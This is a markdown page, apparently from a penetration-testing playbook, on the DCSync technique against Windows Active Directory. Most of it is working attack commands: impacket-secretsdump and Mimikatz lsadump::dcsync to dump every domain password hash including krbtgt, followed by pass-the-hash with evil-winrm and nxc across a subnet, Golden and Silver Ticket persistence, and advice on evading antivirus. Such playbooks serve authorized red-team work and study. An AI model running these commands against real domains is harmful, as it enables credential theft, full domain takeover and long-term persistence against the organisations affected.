---
id: dcsync
title: DCSync
stage: privesc
tags: [windows, ad]
summary: Replicate password hashes from a domain controller using DRSUAPI — requires DCSync rights (DA, DC, or explicit delegation) and gives you every account hash in the domain.
leads_to:
  - domain-admin
  - golden-ticket
  - silver-ticket
---

## Prerequisites

An account with `Replicating Directory Changes` + `Replicating Directory Changes All` on the domain object. This is held by Domain Admins, Domain Controllers, and any account explicitly granted these rights via ACL abuse. Network access to the DC on port 445 or 135+dynamic. No shell on the DC required.

DCSync impersonates a domain controller and requests password replication from the real DC via DRSUAPI. It dumps every account's NT hash — including `krbtgt` (for Golden Tickets), Administrator (for PTH), and all service accounts. It runs entirely over the network from your attacker machine. Prefer impacket over on-box Mimikatz to avoid AV.

## Quick Win

> Dump all hashes with impacket — both Administrator and krbtgt in one command.

```bash
impacket-secretsdump $DOMAIN/user:password@$DC_IP
```

## From Linux (impacket)

> Full dump, targeted dump, and hash-only variants.

```bash
# Dump all domain hashes
impacket-secretsdump $DOMAIN/user:password@$DC_IP
impacket-secretsdump $DOMAIN/user@$DC_IP -hashes :NTLM_HASH

# Just krbtgt (for Golden Ticket — fast)
impacket-secretsdump -just-dc-user krbtgt $DOMAIN/user:password@$DC_IP

# Just NT hashes (skip history and Kerberos keys)
impacket-secretsdump -just-dc $DOMAIN/user:password@$DC_IP
```

## From Windows (Mimikatz)

> On-box Mimikatz — use when impacket network access is blocked.

```powershell
privilege::debug
lsadump::dcsync /domain:$DOMAIN /user:Administrator
lsadump::dcsync /domain:$DOMAIN /user:krbtgt
lsadump::dcsync /domain:$DOMAIN /all /csv
```

## After Dump

> Immediately PTH as Administrator and collect krbtgt for persistence.

```bash
# PTH as Administrator → shell on DC and all machines
evil-winrm -i $DC_IP -u Administrator -H <ADMIN_NTLM>
nxc smb 192.168.x.0/24 -u Administrator -H <ADMIN_NTLM> --local-auth

# Spray domain hashes across all hosts
nxc smb 192.168.x.0/24 -u Administrator -H <ADMIN_NTLM>
```

## Leads To

Administrator NT hash → PTH to any machine → domain-admin. krbtgt hash → Golden Ticket → 10-year forged TGT → golden-ticket persistence. Computer account hashes → Silver Tickets for specific services without DC contact → silver-ticket. Full hash dump → identify other DA accounts → additional PTH paths.
